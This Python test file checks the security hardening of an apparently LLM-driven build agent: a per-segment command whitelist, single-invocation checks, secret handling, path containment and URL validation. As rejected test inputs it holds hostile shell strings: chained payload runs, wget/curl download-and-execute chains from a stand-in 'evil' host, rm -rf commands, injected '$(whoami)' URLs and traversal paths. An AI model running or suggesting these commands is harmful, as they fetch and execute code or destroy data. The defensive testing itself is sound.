"""Regression tests for the REPORT.md security/lifetime hardening.

Covers, by finding ID:

  * SEC-01 — the command whitelist is applied PER SEGMENT, so a chained
    tail cannot ride along on an approved first token, while the
    internally-constructed chains the agent depends on still validate.
  * SEC-02 — LLM-authored fix commands must be a single invocation.
  * SEC-08 — the fixer's "read-only" investigation refuses chains.
  * SEC-03 — file writes are contained to the repository tree.
  * MEM-01 — the caller-side wall timeout stays above the provider's
    HTTP timeout so the socket is released first.
  * MEM-03 — the append-only run records are bounded.
  * CLI-02 — an unsafe repo URL is rejected by a cheap up-front check.

No test here runs Docker, the network, or an LLM.
"""

from __future__ import annotations

import os

from src.tools import CommandValidator


# ===========================================================================
# SEC-01 — per-segment whitelist enforcement
# ===========================================================================


class TestSegmentValidation:
    """A whitelisted first token must not approve the whole line."""

    validator = CommandValidator()

    # Each of these begins with a whitelisted token and then chains to
    # something that is NOT whitelisted — the exact SEC-01 bypass shape.
    CHAINED_BYPASSES = [
        "make ; /tmp/payload",
        "make -j4 && /tmp/payload",
        "cat README.md; /tmp/payload",
        "echo hi | /tmp/payload",
        "grep -rn foo . && /usr/local/bin/backdoor",
        "make\n/tmp/payload",
        "ls -la || /tmp/payload",
    ]

    # Real commands the agent constructs internally. These MUST keep
    # validating or the porting pipeline breaks.
    INTERNAL_CHAINS = [
        (
            "cd /workspace/repos/x && git fetch --depth 1 origin && "
            "git reset --hard FETCH_HEAD && git clean -fdx"
        ),
        (
            "find /workspace/repos/x -path '*/.git' -prune -o -type f "
            "-executable ! -name '*.so*' -print 2>/dev/null | head -20"
        ),
        (
            'cd "$(mktemp -d /tmp/atesor_ar_XXXXXX)"'
            " && ar x /w/lib.a 2>/dev/null"
            " && file *.o | head -1; _rc=$?; cd /;"
            ' rm -rf "$OLDPWD"; exit $_rc'
        ),
        "make -j$(nproc)",
        "cd build && cmake .. -DCMAKE_BUILD_TYPE=Release",
        "stat -c %s /w/f 2>/dev/null || stat -f %z /w/f",
        "echo 'QUFB' | base64 -d > /workspace/repos/x/f.txt",
        "apk add zlib-dev",
        "true",
    ]

    def test_chained_unknown_tail_is_blocked(self) -> None:
        """A non-whitelisted segment rejects the whole command."""
        for command in self.CHAINED_BYPASSES:
            ok, _reason = self.validator.is_safe(command)
            assert ok is False, f"SEC-01 bypass allowed: {command!r}"

    def test_internal_chains_still_validate(self) -> None:
        """Segment validation must not break the agent's own commands."""
        for command in self.INTERNAL_CHAINS:
            ok, reason = self.validator.is_safe(command)
            assert ok is True, f"regression, blocked {command!r}: {reason}"

    def test_split_respects_quoting(self) -> None:
        """Operators inside quotes do not split the command."""
        segments = CommandValidator.split_segments(
            "grep -rn 'a;b|c' . && echo done"
        )
        assert segments == ["grep -rn 'a;b|c' .", "echo done"]

    def test_single_segment_reason_is_stable(self) -> None:
        """The historical rejection wording is preserved."""
        ok, reason = self.validator.is_safe("nmap 1.2.3.4")
        assert ok is False
        assert reason == "Unknown command pattern (not in whitelist)"


# ===========================================================================
# SEC-02 — LLM fix commands must be single invocations
# ===========================================================================


class TestSingleInvocationMode:
    """`is_safe_single` refuses chaining and redirection."""

    validator = CommandValidator()

    def test_single_command_allowed(self) -> None:
        """A plain build command passes."""
        ok, _ = self.validator.is_safe_single("make -j4")
        assert ok is True

    def test_cd_prefix_allowed(self) -> None:
        """The documented `cd <dir> && <cmd>` idiom still passes."""
        ok, _ = self.validator.is_safe_single("cd build && cmake ..")
        assert ok is True

    def test_chain_of_whitelisted_commands_blocked(self) -> None:
        """Individually-safe commands may not be chained together."""
        for command in (
            "wget http://evil/x -O /tmp/x && chmod +x /tmp/x",
            "make && rm -rf /workspace/repos",
            "apk add curl; curl http://evil -o /tmp/p",
        ):
            ok, _ = self.validator.is_safe_single(command)
            assert ok is False, f"chain allowed: {command!r}"

    def test_redirection_blocked(self) -> None:
        """Redirection would let one invocation still write anywhere."""
        ok, _ = self.validator.is_safe_single(
            "echo 'deb http://x' > /etc/apk/repositories"
        )
        assert ok is False

    def test_quoted_redirect_char_is_not_redirection(self) -> None:
        """A `>` inside a quoted literal must not trip the check."""
        ok, _ = self.validator.is_safe_single("grep -rn 'a > b' .")
        assert ok is True

    def test_validate_fix_command_delegates(self) -> None:
        """graph.validate_fix_command refuses a chained fix command."""
        from src.graph import validate_fix_command

        ok, _ = validate_fix_command("make ; /tmp/payload")
        assert ok is False
        ok, _ = validate_fix_command("make -j4")
        assert ok is True


# ===========================================================================
# SEC-05 — secrets must not appear in the process argument list
# ===========================================================================


class TestSecretsStayOutOfArgv:
    """Credential values are passed by env name, never inline in argv."""

    def _run(self, extra_env):
        from types import SimpleNamespace
        from unittest import mock

        from src.tools import execute_command

        captured = {}

        def fake_run(args, **kwargs):
            captured["args"] = args
            captured["env"] = kwargs.get("env")
            return SimpleNamespace(returncode=0, stdout="", stderr="")

        with mock.patch(
            "src.tools.subprocess.run", side_effect=fake_run
        ), mock.patch(
            "src.tools.DockerConfig.is_container_running", return_value=True
        ):
            execute_command("git status", extra_env=extra_env)
        return captured

    def test_token_absent_from_argv_present_in_env(self) -> None:
        """The bearer header never reaches `ps`, but does reach docker."""
        secret = "Authorization: bearer ghp_TESTSECRET"
        captured = self._run(
            {
                "GIT_TERMINAL_PROMPT": "0",
                "GIT_CONFIG_VALUE_0": secret,
            }
        )
        argv = " ".join(captured["args"])

        assert "ghp_TESTSECRET" not in argv
        assert "GIT_CONFIG_VALUE_0" in captured["args"]
        assert captured["env"]["GIT_CONFIG_VALUE_0"] == secret
        # Non-secret values stay self-describing on the command line.
        assert "GIT_TERMINAL_PROMPT=0" in captured["args"]

    def test_secret_key_detection(self) -> None:
        """Common credential key shapes are recognised."""
        from src.tools import _is_secret_env_key

        for key in (
            "GIT_CONFIG_VALUE_0",
            "GITHUB_TOKEN",
            "OPENAI_API_KEY",
            "MY_PASSWORD",
            "some_secret",
        ):
            assert _is_secret_env_key(key), key
        for key in ("GIT_TERMINAL_PROMPT", "LANG", "GIT_SSH_COMMAND"):
            assert not _is_secret_env_key(key), key


# ===========================================================================
# SEC-03 — writes contained to the repository tree
# ===========================================================================


class TestRepoContainment:
    """`_is_within_repo` rejects traversal out of the repo."""

    def test_paths_inside_repo_allowed(self, tmp_path) -> None:
        """Normal in-repo paths are accepted."""
        from src.graph import _is_within_repo

        repo = tmp_path / "repo"
        repo.mkdir()
        assert _is_within_repo(str(repo / "src" / "main.c"), str(repo))
        assert _is_within_repo(str(repo), str(repo))

    def test_traversal_and_absolute_paths_blocked(self, tmp_path) -> None:
        """`..` and absolute escapes are refused."""
        from src.graph import _is_within_repo

        repo = tmp_path / "repo"
        repo.mkdir()
        for escape in (
            os.path.join(str(repo), "..", "..", "etc", "apk", "repositories"),
            "/etc/apk/repositories",
            os.path.join(str(repo), "../outside.txt"),
        ):
            assert not _is_within_repo(escape, str(repo)), escape


# ===========================================================================
# MEM-01 / MEM-03 — lifetime invariants
# ===========================================================================


class TestLifetimeInvariants:
    """Timeout ordering and bounded growth."""

    def test_wall_timeout_exceeds_provider_timeout(self) -> None:
        """The socket must be released before we give up waiting."""
        from src.graph import LLM_WALL_TIMEOUT
        from src.llm_helpers import LLM_WALL_TIMEOUT as HELPER_TIMEOUT
        from src.models import LLM_REQUEST_TIMEOUT

        assert LLM_WALL_TIMEOUT > LLM_REQUEST_TIMEOUT
        assert HELPER_TIMEOUT > LLM_REQUEST_TIMEOUT

    def test_audit_trail_is_bounded(self) -> None:
        """log_event caps the trail instead of growing forever."""
        from src.state import MAX_AUDIT_EVENTS, create_initial_state

        state = create_initial_state("https://github.com/foo/bar")
        for i in range(MAX_AUDIT_EVENTS + 250):
            state.log_event("scripted_op", {"operation": f"op{i}"})

        assert len(state.audit_trail) == MAX_AUDIT_EVENTS
        # The newest events must survive; the oldest are dropped.
        assert state.audit_trail[-1]["data"]["operation"] == (
            f"op{MAX_AUDIT_EVENTS + 249}"
        )

    def test_error_history_is_bounded(self) -> None:
        """add_error caps history and keeps the most recent record."""
        from src.state import (
            MAX_ERROR_HISTORY,
            create_error_record,
            create_initial_state,
        )

        state = create_initial_state("https://github.com/foo/bar")
        for i in range(MAX_ERROR_HISTORY + 40):
            state.add_error(create_error_record(f"boom {i}", "make"))

        assert len(state.error_history) == MAX_ERROR_HISTORY
        assert state.error_history[-1].message.endswith(
            str(MAX_ERROR_HISTORY + 39)
        )


# ===========================================================================
# CLI-02 — cheap up-front URL validation
# ===========================================================================


class TestRepoUrlValidation:
    """`is_valid_repo_url` gates the CLI before any expensive work."""

    def test_valid_urls_accepted(self) -> None:
        """Plain http(s) URLs pass."""
        from src.state import is_valid_repo_url

        assert is_valid_repo_url("https://github.com/madler/zlib")
        assert is_valid_repo_url("https://github.com/foo/bar.git")

    def test_unsafe_urls_rejected(self) -> None:
        """Other schemes and shell metacharacters are refused."""
        from src.state import is_valid_repo_url

        for bad in (
            "git@github.com:foo/bar.git",
            "ftp://example.org/x",
            "https://github.com/foo/bar; rm -rf /",
            "https://github.com/foo/$(whoami)",
            "not a url",
            "",
        ):
            assert not is_valid_repo_url(bad), bad
